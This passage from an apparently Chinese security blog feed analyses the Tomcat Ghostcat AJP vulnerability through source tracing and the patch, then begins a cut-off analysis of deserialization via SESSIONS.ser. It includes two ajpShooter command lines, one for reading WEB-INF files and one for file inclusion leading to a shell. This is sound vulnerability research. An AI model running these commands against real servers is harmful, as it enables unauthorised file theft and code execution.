&lt; 9.0.31</span><br><span class="line">Apache Tomcat 8.x &lt; 8.5.51</span><br><span class="line">Apache Tomcat 7.x &lt; 7.0.100</span><br><span class="line">Apache Tomcat 6.x</span><br></pre></td></tr></table></figure><h1 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h1><p>这里网上有很多工具，这里就不再重新分析 <code>AJP</code> 协议来造轮子了。后面都是基于工具 <a href="https://github.com/00theway/Ghostcat-CNVD-2020-10487">https://github.com/00theway/Ghostcat-CNVD-2020-10487</a> 来验证漏洞的。</p><p>用法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">文件读取</span><br><span class="line">python ajpShooter.py http://127.0.0.1:8080/&lt;目标项目&gt; 8009 /WEB-INF/web.xml read</span><br><span class="line">文件包含（getshell的前提是能够上传文件）</span><br><span class="line">python ajpShooter.py http://127.0.0.1:8080/&lt;目标项目&gt; 8009 /a.txt eval</span><br></pre></td></tr></table></figure><p><img src="/imgs/Pasted%20image%2020240305195414.png"></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="漏洞触发点"><a href="#漏洞触发点" class="headerlink" title="漏洞触发点"></a>漏洞触发点</h2><p>这里以 <code>Tomcat 8.5.42</code> 的源代码来分析调试。</p><p>由于我们刚开始对这个漏洞的触发点一无所知，只知道 <code>poc</code> ，所以可以先通过 <code>github</code> 的 <code>diff</code> 功能看一下修复了漏洞后的版本做了哪些修改。</p><p><img src="/imgs/Pasted%20image%2020240305201537.png"></p><p>通过代码对比功能我们可以看到 <code>tomcat</code> 从 <code>8.5.50</code> 版本升级到 <code>8.5.51</code> 版本一共更改了 <code>156</code> 个文件。</p><p>通过 <code>ajp</code> 关键字可以发现 <code>ajp</code> 相关的源代码修改集中在 <code>org.apache.coyote.ajp</code> 包里。</p><p><img src="/imgs/Pasted%20image%2020240305201708.png"></p><p>进一步分析改动的源代码，我们可以发现 <code>org.apache.coyote.ajp.AjpProcessor</code> 中的 <code>prepareRequest()</code> 方法改动的比较大。因此过会调试 <code>Tomcat</code> 源码的时候可以在这个方法打上断点来分析分析。</p><p><img src="/imgs/Pasted%20image%2020240305202011.png"></p><p>发现当我们发送 <code>poc</code> 时，确实可以在这个方法断住。</p><p><img src="/imgs/Pasted%20image%2020240305202157.png"></p><blockquote><p>此外，由于这里的漏洞和文件读取相关，因此肯定会用到 <code>java.io.File</code> ，所以我们可以给 <code>File</code> 的构造方法的开头都打上断点，看什么时候进入的参数是 <code>poc</code> 读取的文件。不过这里要先运行起来后再打断点，不然 <code>File</code> 的断点会比较多。</p></blockquote><p>发现也成功断住了，这样就很容易看出来漏洞的触发点在哪里了。</p><p><img src="/imgs/Pasted%20image%2020240305203152.png"></p><p>发现漏洞的关键是请求交给到了 <code>org.apache.catalina.servlets.DefaultServlet</code> 来处理。</p><p><img src="/imgs/Pasted%20image%2020240305203748.png"></p><p>而在这个类在处理请求的时候会在 <code>getRelativePath()</code> 中读取 <code>request</code> 中的 <code>RequestDispatcher.INCLUDE_SERVLET_PATH</code> 属性并返回，交给 <code>resources.getResource()</code> 方法读取对应的文件内容，并在最后返回到 <code>response</code> 中。</p><p><img src="/imgs/Pasted%20image%2020240305204750.png"></p><p><img src="/imgs/Pasted%20image%2020240305204345.png"></p><p><img src="/imgs/Pasted%20image%2020240305204931.png"></p><h2 id="webapps目录下任意文件读取"><a href="#webapps目录下任意文件读取" class="headerlink" title="webapps目录下任意文件读取"></a>webapps目录下任意文件读取</h2><blockquote><p>这里我们就会好奇一点，这里 <code>Tomcat</code> 的 <code>DefaultServlet</code> 是做什么的，并且请求为什么会交给这个 <code>Servlet</code> 进行处理。</p></blockquote><blockquote><p>根据查找的资料可以知道：<br><code>DefaultServlet</code> 为默认的 <code>Servlet</code> ，当客户端请求不能匹配其他所有 <code>Servlet</code> 时，将由这个 <code>Servlet</code> 处理。<code>DefaultServlet</code> 主要用于处理静态资源，如 <code>HTML</code> 、图片、<code>CSS</code> 、<code>JS</code> 文件等，而且为了提升服务器性能，<code>Tomcat</code> 会对访问文件进行缓存。</p></blockquote><p>但是我们知道，正常情况下 <code>DefaultServlet</code> 是不应该能够读取 <code>WEB-INF</code> 和 <code>META-INF</code> 目录下的内容的，但是这里的 <code>poc</code> 是可以的，这里是怎么做到的？我们先来分析正常情况下，<code>Tomcat</code> 是怎么防止上面两个目录下的内容被读取的。</p><blockquote><p>正常访问时，在 <code>StandardContextValve.invoke()</code> 中会判断 <code>request</code> 中的 <code>requestPath</code> 属性（其值等于去掉了项目名后的 <code>URI</code> ）是否等于或以 <code>/META-INF</code> 或者 <code>/WEB-INF</code> 开头，如果是就终止请求，返回 <code>404</code> 。</p></blockquote><p><img src="/imgs/Pasted%20image%2020240305214305.png"></p><p>然后我们再观察漏洞情况下这里的参数。发现即使我们目标读取的文件是 <code>/WEB-INF/web.xml</code> ，但是这里的 <code>requestPath</code> 却是 <code>/index.txt</code> 。</p><p><img src="/imgs/Pasted%20image%2020240305214826.png"></p><p>接着我们来抓包看一下上面的 <code>poc</code> 到底发了什么恶意的数据给 <code>Tomcat</code> 。</p><p><img src="/imgs/Pasted%20image%2020240305220603.png"></p><p>可以发现 <code>index.txt</code> 是 <code>AJP</code> 协议数据包中 <code>URI</code>字段的内容，而我们实际读取的文件内容在 <code>javax.servlet.include.request_path</code> 字段中。这时我们需要分析 <code>Tomcat</code> 是怎么处理 <code>AJP</code> 协议的了。为什么 <code>requestPath</code> 的值可以和实际 <code>Tomcat</code> 返回的文件路径不一致。这里就到了这个漏洞的关键所在。</p><h2 id="漏洞的关键"><a href="#漏洞的关键" class="headerlink" title="漏洞的关键"></a>漏洞的关键</h2><blockquote><p>这个漏洞的关键就是在 <code>AjpProcessor</code> 中的 <code>prepareRequest()</code> 方法存在漏洞，可以让攻击者通过控制 <code>AJP</code> 协议报文的请求内容，来为 <code>request</code> 对象设置任意的 <code>attribute</code> 。</p></blockquote><p>我们来分析一下这个方法。<br>首先要知道 <code>AJP</code> 的请求数据包存在 <code>AjpMessage</code> 的 <code>buf</code> 字段中，可以对比一下这个字段和上面 <code>wireshark</code> 抓包的内容是一致的。</p><p><img src="/imgs/Pasted%20image%2020240305221009.png"></p><p><code>prepareRequest()</code> 这个方法主要是在处理 <code>AJP</code> 数据包（也就是处理 <code>ApiMessage</code> 的 <code>buf</code> 字段），将其信息存到 <code>request</code> 中。</p><p><img src="/imgs/Pasted%20image%2020240305221033.png"></p><p>在这个方法的末尾会根据数据包中的内容对 <code>request</code> 的 <code>attribute</code> 赋值，而且没有任何过滤。这样我们就可以控制 <code>request</code> 的 <code>attributes</code> 属性。</p><p><img src="/imgs/Pasted%20image%2020240306000156.png"></p><p>而正好在 <code>DefaultServlet</code> 的 <code>getRelativePath()</code> 中，如果 <code>request.getAttribute(RequestDispatcher.INCLUDE_REQUEST_URI)</code> 的值不为 <code>null</code> ，就会返回 <code>servletPath = (String) request.getAttribute(RequestDispatcher.INCLUDE_SERVLET_PATH)</code> 的值，然后读取这个值对应的文件。</p><p><img src="/imgs/Pasted%20image%2020240306000843.png"></p><p>这样两个 <code>gadget</code> 合在一起就造成了任意文件读取漏洞。这里由于在读取文件的时候会判断文件路径是否合法，从而无法通过 <code>../</code> 来读取 <code>webapps</code> 目录外的内容。</p><p><img src="/imgs/Pasted%20image%2020240306001747.png"></p><p>介绍完了文件读取漏洞，我们再看看是怎么完成文件包含漏洞的。</p><h2 id="文件包含命令执行"><a href="#文件包含命令执行" class="headerlink" title="文件包含命令执行"></a>文件包含命令执行</h2><p>通过抓包，我们发现 <code>poc</code> 唯一的变化就是 <code>URI</code> ，将原来的 <code>index.txt</code> 改为了 <code>index.jsp</code> 。</p><p><img src="/imgs/Pasted%20image%2020240306002505.png"></p><p>我们再来跟一下 <code>Tomcat</code> 的流程，由于这次是命令执行，因此我们把断点打到 <code>Runtime.exec()</code> 方法的开头。</p><p>发现这次不再是利用 <code>DefaultServlet</code> 来读文件了，而是利用 <code>JspServlet</code> 来编译攻击者指定的文件，即使文件的后缀名不为 <code>jsp</code> 。</p><p><img src="/imgs/Pasted%20image%2020240306002934.png"></p><p>这里包含的逻辑是如果 <code>jspUri</code> 为 <code>null</code> ，那就从 <code>request.getAttribute(RequestDispatcher.INCLUDE_SERVLET_PATH)</code> 中获取值来编译。如果后面的值还为 <code>null</code> ，就通过用户请求的 <code>URI</code> 来获取要编译的 <code>jsp</code> 文件。所以用户正常访问时，代码应该走到 <code>else</code> 中，这里我们通过让 <code>request.getAttribute(RequestDispatcher.INCLUDE_SERVLET_PATH)</code> 不为 <code>null</code> ，从而没有走到 <code>else</code> 语句中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span> <span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line"><span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// jspFile may be configured as an init-param for this servlet instance</span></span><br><span class="line"><span class="type">String</span> <span class="variable">jspUri</span> <span class="operator">=</span> jspFile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (jspUri == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Check to see if the requested JSP has been the target of a</span></span><br><span class="line"><span class="comment"> * RequestDispatcher.include()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">jspUri = (String) request.getAttribute(</span><br><span class="line">RequestDispatcher.INCLUDE_SERVLET_PATH);</span><br><span class="line"><span class="keyword">if</span> (jspUri != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Requested JSP has been target of</span></span><br><span class="line"><span class="comment"> * RequestDispatcher.include(). Its path is assembled from the</span></span><br><span class="line"><span class="comment"> * relevant javax.servlet.include.* request attributes</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">String</span> <span class="variable">pathInfo</span> <span class="operator">=</span> (String) request.getAttribute(</span><br><span class="line">RequestDispatcher.INCLUDE_PATH_INFO);</span><br><span class="line"><span class="keyword">if</span> (pathInfo != <span class="literal">null</span>) &#123;</span><br><span class="line">jspUri += pathInfo;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Requested JSP has not been the target of a</span></span><br><span class="line"><span class="comment"> * RequestDispatcher.include(). Reconstruct its path from the</span></span><br><span class="line"><span class="comment"> * request&#x27;s getServletPath() and getPathInfo()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">jspUri = request.getServletPath();</span><br><span class="line"><span class="type">String</span> <span class="variable">pathInfo</span> <span class="operator">=</span> request.getPathInfo();</span><br><span class="line"><span class="keyword">if</span> (pathInfo != <span class="literal">null</span>) &#123;</span><br><span class="line">jspUri += pathInfo;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">log.debug(<span class="string">&quot;JspEngine --&gt; &quot;</span> + jspUri);</span><br><span class="line">log.debug(<span class="string">&quot;\t     ServletPath: &quot;</span> + request.getServletPath());</span><br><span class="line">log.debug(<span class="string">&quot;\t        PathInfo: &quot;</span> + request.getPathInfo());</span><br><span class="line">log.debug(<span class="string">&quot;\t        RealPath: &quot;</span> + context.getRealPath(jspUri));</span><br><span class="line">log.debug(<span class="string">&quot;\t      RequestURI: &quot;</span> + request.getRequestURI());</span><br><span class="line">log.debug(<span class="string">&quot;\t     QueryString: &quot;</span> + request.getQueryString());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="type">boolean</span> <span class="variable">precompile</span> <span class="operator">=</span> preCompile(request);</span><br><span class="line">serviceJspFile(request, response, jspUri, precompile);</span><br><span class="line">&#125; <span class="keyword">catch</span> (RuntimeException e) &#123;</span><br><span class="line"><span class="keyword">throw</span> e;</span><br><span class="line">&#125; <span class="keyword">catch</span> (ServletException e) &#123;</span><br><span class="line"><span class="keyword">throw</span> e;</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line"><span class="keyword">throw</span> e;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">ExceptionUtils.handleThrowable(e);</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServletException</span>(e);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Tomcat如何判断某次请求交给哪个Servlet处理"><a href="#Tomcat如何判断某次请求交给哪个Servlet处理" class="headerlink" title="Tomcat如何判断某次请求交给哪个Servlet处理"></a>Tomcat如何判断某次请求交给哪个Servlet处理</h2><p>那 <code>poc</code> 是怎么控制请求是走到 <code>JspServlet</code> 中还是 <code>DefaultServlet</code> 中呢？这就要看 <code>Tomcat</code> 是怎么分发请求的。这里的核心逻辑在 <code>org.apache.catalina.mapper.Mapper#internalMap()</code> 中。</p><blockquote><p>这个方法的主要作用就是在判断某次请求对应的 <code>host</code> ，<code>context</code> 和 <code>mapper</code> ，并将其封装到 <code>request</code> 中，以便后续通过 <code>pipeline</code> 的机制依次调用。</p></blockquote><p><img src="/imgs/Pasted%20image%2020240306005531.png"></p><p>这个方法首先根据 <code>request</code> 的 <code>host</code> 字段来判断这次请求对应的 <code>Host</code> ，<code>Tomcat</code> 往往只有一个 <code>Host</code> ，因此这里的逻辑就不细说了。</p><p><img src="/imgs/Pasted%20image%2020240306010315.png"></p><p>然后是根据 <code>request</code> 的 <code>uri</code> 来判断这次请求对应的 <code>Context</code> ，也就是访问的是 <code>webapps</code> 下面部署的哪个项目，因为 <code>Tomcat</code> 是可以同时部署多个项目的。这里判断的逻辑是 <code>uri</code> 的开头。</p><p><img src="/imgs/Pasted%20image%2020240306010552.png"></p><p>然后专门将判断某次请求对应的 <code>Mapper</code> （也就是这次请求交给哪个 <code>Servlet</code> 处理）封装到 <code>internalMapWrapper()</code> 方法中来调用，因为这一块稍微复杂点。</p><p><img src="/imgs/Pasted%20image%2020240306010811.png"></p><p>具体逻辑如下：</p><p>在 <code>contextVersion.exactWrapper</code> 变量中保存的是程序员自定义的且路由精确（没有通配符）的 <code>Servlet</code> ，<code>Servlet</code> 匹配的路径存在 <code>name</code> 变量中。<br>在 <code>contextVersion.wildcardWrapper</code> 变量中保存的是程序员自定义的且有通配符的 <code>Servlet</code> ，<code>Servlet</code> 匹配的路径存在 <code>name</code> 变量中。</p><p><img src="/imgs/Pasted%20image%2020240306011019.png"></p><p>然后按照下面的顺序进行判断（在源码的注释中也写的很清楚了），一旦匹配成功就不会再进行后面的匹配了：</p><ol><li>先精确匹配，判断 <code>servletPath</code> 是否有和程序员自定义的且路由精确的 <code>servlet</code> 路径是一样的，如果是则调用对应的 <code>Servlet</code> 进行处理。</li><li>再通配符匹配，判断 <code>servletPath</code> 是否有和程序员自定义的且是通配符匹配的 <code>servlet</code> 路径是一样的，如果是则调用对应的 <code>Servlet</code> 进行处理。</li><li>再判断 <code>servletPath</code> 的后缀是否为 <code>jsp</code> 或者 <code>jspx</code> ，如果是则调用 <code>JspServlet</code> 进行处理。</li><li>再判断 <code>servletPath</code> 是否 <code>Tomcat</code> 的欢迎界面。</li><li>如果上述条件都不满足，就调用 <code>DefaultServlet</code> 来当作静态文件处理，这就匹配了前面对 <code>DefaultServlet</code> 中会读 <code>webapps</code> 目录下的文件的解释。</li></ol><p><img src="/imgs/Pasted%20image%2020240306011958.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>到这里就很清楚了，第一次文件读取攻击是通过触发 <code>Tomcat</code> 调用 <code>DefaultServlet</code> 处理，来读取并返回攻击者指定的任意 <code>webapps</code> 目录下的文件，从而可以读取网页在 <code>WEB-INF</code> 目录下的源码。第二次文件包含攻击是通过修改 <code>AJP</code> 数据包中的 <code>URI</code> 字段以 <code>jsp</code> 结尾，触发 <code>Tomcat</code> 调用 <code>JspServlet</code> 处理，来编译攻击者指定的任意文件，从而命令执行。<br>而两者的造成都是因为 <code>AjpProcessor#prepareRequest()</code> 方法中对 <code>request</code> 的 <code>attributes</code> 赋值没有任何限制，造成黑客在 <code>Tomcat</code> 调用 <code>DefaultServlet</code> 和 <code>JspServlet</code> 进行处理的时候携带了恶意的参数。</p><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>在 <code>AjpProcessor#prepareRequest()</code> 方法中做了对 <code>request</code> 的 <code>attributes</code> 赋值的限制。现在只能对特定的 <code>attribute</code> 进行控制。</p><p>修复后的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// All &#x27;known&#x27; attributes will be processed by the previous</span></span><br><span class="line"><span class="comment">// blocks. Any remaining attribute is an &#x27;arbitrary&#x27; one.</span></span><br><span class="line"><span class="type">Pattern</span> <span class="variable">pattern</span> <span class="operator">=</span> protocol.getAllowedRequestAttributesPatternInternal();</span><br><span class="line"><span class="keyword">if</span> (pattern != <span class="literal">null</span> &amp;&amp; pattern.matcher(n).matches()) &#123;</span><br><span class="line">request.setAttribute(n, v);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">log.warn(sm.getString(<span class="string">&quot;ajpprocessor.unknownAttribute&quot;</span>, n));</span><br><span class="line">response.setStatus(<span class="number">403</span>);</span><br><span class="line">setErrorState(ErrorState.CLOSE_CLEAN, <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html">https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html</a><br><a href="https://httpd.apache.org/docs/2.2/mod/mod_proxy_ajp.html">https://httpd.apache.org/docs/2.2/mod/mod_proxy_ajp.html</a><br><a href="https://www.00theway.org/2020/02/22/ajp-shooter-from-source-code-to-exploit/">https://www.00theway.org/2020/02/22/ajp-shooter-from-source-code-to-exploit/</a><br><a href="https://mp.weixin.qq.com/s/GzqLkwlIQi_i3AVIXn59FQ">https://mp.weixin.qq.com/s/GzqLkwlIQi_i3AVIXn59FQ</a></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> Tomcat </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Tomcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat的SESSIONS.ser文件利用及其源码分析</title>
      <link href="/2024/03/05/Tomcat%E7%9A%84SESSIONS.ser%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8%E5%8F%8A%E5%85%B6%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
      <url>/2024/03/05/Tomcat%E7%9A%84SESSIONS.ser%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8%E5%8F%8A%E5%85%B6%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p><code>Tomcat</code> 默认会开启 <code>session</code> 的持久化功能，它是通过当 <code>Tomcat</code> 正常退出的时候，会将 <code>session</code> 的值进行序列化，存到 <code>work</code> 目录下的 <code>SESSIONS.ser</code> 文件中（正常来说完整路径是 <code>&lt;Tomcat的安装目录&gt;/work/Catalina/localhost/&lt;项目名&gt;/SESSSIONS.ser</code>），然后下次启动时会对这个文件中的内容进行反序列化（启动成功后就会删除 <code>SESSIONS.ser</code> 文件），从而恢复 <code>session</code> 的值。</p><p><img src="/imgs/Pasted%20image%2020240304011830.png"></p><p>如果我们可以控制 <code>SESSIONS.ser</code> 文件的内容（往往是通过任意文件上传），就可能造成反序列化漏洞。</p><h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><p>这里先来分析一下 <code>SESSIONS.ser</code> 文件的内容。先来试着写入值到 <code>session</code> 中，然后关闭 <code>Tomcat</code> 。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.just.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.just.pojo.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpSession;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/demo&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> req.getSession();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">user</span> <span class="operator">=</span> session.getAttribute(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;user = &quot;</span> + user);</span><br><span class="line">        <span class="keyword">if</span> (user == <span class="literal">null</span>) &#123;</span><br><span class="line">            session.setAttribute(<span class="string">&quot;user&quot;</span>, <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;test&quot;</span>, <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后可以得到上面的 <code>session</code> 对应的 <code>SESSIONS.ser</code> 文件。</p><p><img src="/imgs/Pasted%20image%2020240304011938.png"></p><p>根据开头的序列化魔数 <code>ACED0005</code> ，就可以很明显的知道里面存的是 <code>jdk</code> 原生序列化的内容。至于其内容存的信息，我们可以分析其源码。</p><p>我们可以找到持久化 <code>session</code> 的源码在 <code>org.apache.catalina.session.StandardSession</code> 类中的 <code>doReadObject()</code> 和 <code>doWriteObject()</code> 方法中。</p><p><img src="/imgs/Pasted%20image%2020240304023201.png"></p><p>根据这里的源码，我们就可以知道其序列化存的信息是什么了。但是这里需要注意的是，如果熟悉序列化的结构的人，会发现这里貌似源码和 <code>SESSIONS.ser</code> 文件的内容对不上。因为 <code>SESSIONS.ser</code> 文件中的第一块序列化的数据很明显是 <code>java.lang.Integer</code> 类型的，而源码中第一次 <code>readObject()</code> 返回的结果显示是 <code>Long</code> 类型的。很明显在 <code>doReadObject()</code> 之前还有一次反序列化。然后不难找到，在这里传入 <code>stream</code> 给 <code>doReadObject()</code> 方法的时候其实已经操作过 <code>stream</code> 了。</p><p><img src="/imgs/Pasted%20image%2020240304024013.png"></p><p>这下就对的上了。</p><p>根据分析源码，不难得到这里 <code>SESSIONS.ser</code> 的结构是：</p><blockquote><p>开头一个数字标识有几个 <code>session</code> ，然后后面的就是各个 <code>session</code> 的具体信息。</p></blockquote><p>有一点需要注意的是的是：</p><blockquote><p>我们可以发现这里都是调用的 <code>readObject()</code> 然后对结果进行强制类型转化，而非调用 <code>readInt()</code> ，<code>readDouble()</code> 方法。这样我们构造恶意的 <code>SESSIONS.ser</code> 文件就很容易了，就不需要在意其结构，就直接写入一个恶意的对象。因为对 <code>readObject()</code> 结果进行强制类型转化并不会影响反序列化漏洞，而调用的不是 <code>readObject()</code> 而是其它 <code>readXxx()</code> 方法，就需要考虑写入 <code>SESSIONS.ser</code> 文件的结构才能实现反序列化漏洞。<br>不过再怎么样也都可以造成反序列化漏洞，这里只是说明一下为什么直接序列化一个恶意的对象到 <code>SESSIONS.ser</code> 文件中就可以造成反序列化漏洞了。</p></blockquote><p>然后我们分析一下 是怎么调用的 <code>doReadObject()</code> 和 <code>doWriteObject()</code> 方法。</p><p>我们可以调试 <code>Tomcat</code> 启动的过程。发现其核心关于持久化 <code>session</code> 的逻辑在 <code>org.apache.catalina.session.StandardManager</code> 中。其通过 <code>doLoad()</code> 方法在 <code>Tomcat</code> 停止的时候加载 <code>SESSIONS.ser</code> 文件然后删除 <code>SESSIONS.ser</code> 文件，通过 <code>doUnload()</code> 方法在 <code>Tomcat</code> 停止的时候存储 <code>session</code> 的内容到 <code>SESSION.ser</code> 文件中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span 